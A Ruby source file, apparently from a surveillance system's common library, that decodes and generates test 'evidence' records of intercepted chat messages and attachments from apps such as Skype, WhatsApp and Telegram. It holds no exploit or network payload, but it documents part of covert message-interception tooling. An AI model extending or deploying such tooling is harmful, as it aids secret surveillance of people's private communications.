# encoding: utf-8

require 'rcs-common/trace'
require 'rcs-common/evidence/common'

module RCS

module Chat

  CHAT_PROGRAM = {
      0x01 => :skype,
      0x02 => :facebook,
      0x03 => :twitter,
      0x04 => :gmail,
      0x05 => :bbm,
      0x06 => :whatsapp,
      0x07 => :msn,
      0x08 => :adium,
      0x09 => :viber,
      0x0a => :wechat,
      0x0d => :line,
      0x0e => :telegram,
      0x0f => :yahoo,
      0x10 => :messages,
  }

  CHAT_INCOMING = 0x00000001
  CHATMM_NOT_RETRIEVED = 0x10000000

  def decode_from_to(common_info, stream)
    tm = stream.read 36
    info = Hash[common_info]
    info[:da] = Time.gm(*(tm.unpack('L*')), 0)
    info[:data] = Hash.new if info[:data].nil?

    program = stream.read(4).unpack('L').first
    info[:data][:program] = CHAT_PROGRAM[program]

    flags = stream.read(4).unpack('L').first
    info[:data][:incoming] = (flags & CHAT_INCOMING != 0) ? 1 : 0
    info[:data][:size] = (flags & CHATMM_NOT_RETRIEVED != 0) ? 0 : 1

    from = stream.read_utf16le_string
    info[:data][:from] = from.utf16le_to_utf8
    #trace :debug, "CHAT from: #{info[:data][:from]}"
    from_display = stream.read_utf16le_string
    info[:data][:from_display] = from_display.utf16le_to_utf8
    #trace :debug, "CHAT from_display: #{info[:data][:from_display]}"

    rcpt = stream.read_utf16le_string
    info[:data][:rcpt] = rcpt.utf16le_to_utf8

    # remove the sender from the recipients (damned lazy Naga who does not want to parse it on the client)
    recipients = info[:data][:rcpt].split(',')
    recipients.delete(info[:data][:from])
    info[:data][:rcpt] = recipients.join(',')
    #trace :debug, "CHAT rcpt: #{info[:data][:rcpt]}"

    rcpt_display = stream.read_utf16le_string
    info[:data][:rcpt_display] = rcpt_display.utf16le_to_utf8
    if info[:data][:program] == :skype
      # remove the sender from the recipients (damned lazy Naga who does not want to parse it on the client)
      recipients = info[:data][:rcpt_display].split(',')
      recipients.delete(info[:data][:from])
      info[:data][:rcpt_display] = recipients.join(',')
    end
    #trace :debug, "CHAT rcpt_display: #{info[:data][:rcpt_display]}"

    return info
  end
end

module ChatEvidence
  include RCS::Tracer
  include Chat

  ELEM_DELIMITER = 0xABADC0DE
  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]

  def content
    program = [CHAT_PROGRAM.keys.sample].pack('L')
    users = ["ALoR", "Bruno", "Naga", "Quez", "Tizio", "Caio"]
    from = users.sample.to_utf16le_binary_null
    to = users.sample.to_utf16le_binary_null

    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write [0].pack('L')
    content.write from
    content.write from
    content.write to
    content.write to
    content.write KEYSTROKES.sample.to_utf16le_binary_null
    content.write [ ELEM_DELIMITER ].pack('L')

    content.write [t.sec + 5, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write [1].pack('L')
    content.write to
    content.write to
    content.write from
    content.write from
    content.write KEYSTROKES.sample.to_utf16le_binary_null
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end

  def generate_content
    [ content ]
  end

  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?

      info = decode_from_to(common_info, stream)

      keystrokes = stream.read_utf16le_string
      info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
      #trace :debug, "CHAT content: #{info[:data][:content]}"

      delim = stream.read(4).unpack("L").first
      raise EvidenceDeserializeError.new("Malformed CHAT (missing delimiter)") unless delim == ELEM_DELIMITER

      yield info if block_given?
    end
    :delete_raw
  end
end # ChatEvidence


module ChatmmEvidence
  include RCS::Tracer
  include Chat

  def content
    path = File.join(File.dirname(__FILE__), 'content', 'screenshot', '00' + (rand(3) + 1).to_s + '.jpg')
    File.open(path, 'rb') {|f| f.read }
  end

  def generate_content
    [ content ]
  end

  def additional_header
     program = [CHAT_PROGRAM.keys.sample].pack('L')
     flags = [[0,1].sample].pack('L')
     users = ["ALoR", "Bruno", "Naga", "Quez", "Tizio", "Caio"]
     from = users.sample.to_utf16le_binary_null
     to = users.sample.to_utf16le_binary_null
     mime = "image/jpeg".to_utf16le_binary_null
     filename = "nice_picture.jpeg".to_utf16le_binary_null

     header = StringIO.new
     t = Time.now.getutc
     header.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
     header.write program
     header.write flags
     header.write from
     header.write from
     header.write to
     header.write to
     header.write mime
     header.write filename

     header.string
   end


  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete CHAT MultiMedia") if data.nil? or data.bytesize == 0

    stream = StringIO.new data
    info = decode_from_to({}, stream)

    content_type = stream.read_utf16le_string
    info[:data][:type] = content_type.utf16le_to_utf8 unless content_type.nil?

    filename = stream.read_utf16le_string
    info[:data][:path] = filename.utf16le_to_utf8 unless filename.nil?

    return info
   end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    info[:grid_content] = chunks.join if info[:data][:size] != 0
    yield info if block_given?
    :delete_raw
  end

end


module ChatoldEvidence
  include RCS::Tracer

  ELEM_DELIMITER = 0xABADC0DE
  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
  
  def content
    program = ["MSN", "Skype", "Yahoo", "Paltalk", "Sticazzi"].sample.to_utf16le_binary_null
    topic = ["Chatting...", "New projecs", "Fuffa", "Bubbole"].sample.to_utf16le_binary_null
    users = ["ALoR, Daniel", "Bruno, Fulvio", "Naga, Quez", "Tizio, Caio"].sample.to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write topic
    content.write users
    content.write KEYSTROKES.sample.to_utf16le_binary_null
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      tm = stream.read 36
      #trace :info, "CHAT Time.gm #{tm.unpack('l*')}"
      info = Hash[common_info]
      info[:da] = Time.gm(*(tm.unpack('L*')), 0)
      info[:data] = Hash.new if info[:data].nil?
      info[:data][:program] = ''
      info[:data][:topic] = ''
      info[:data][:peer] = ''
      info[:data][:content] = ''

      program = stream.read_utf16le_string
      info[:data][:program] = program.utf16le_to_utf8 unless program.nil?
      #trace :info, "CHAT Program #{info[:data][:program]}"
      topic = stream.read_utf16le_string
      info[:data][:topic] = topic.utf16le_to_utf8 unless topic.nil?
      #trace :info, "CHAT Topic #{info[:data][:topic]}"
      users = stream.read_utf16le_string
      info[:data][:peer] = users.utf16le_to_utf8 unless users.nil?
      #trace :info, "CHAT Users #{info[:data][:users]}"
      keystrokes = stream.read_utf16le_string
      info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
      
      begin
        info[:data][:content] = JSON.parse info[:data][:content]
      rescue Exception => e
        # leave content as is
      end
      
      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed CHAT OLD (missing delimiter)") unless delim == ELEM_DELIMITER

      #puts "decode_content #{info}"

      yield info if block_given?
    end
    :delete_raw
  end
end # ChatoldEvidence


end # ::RCS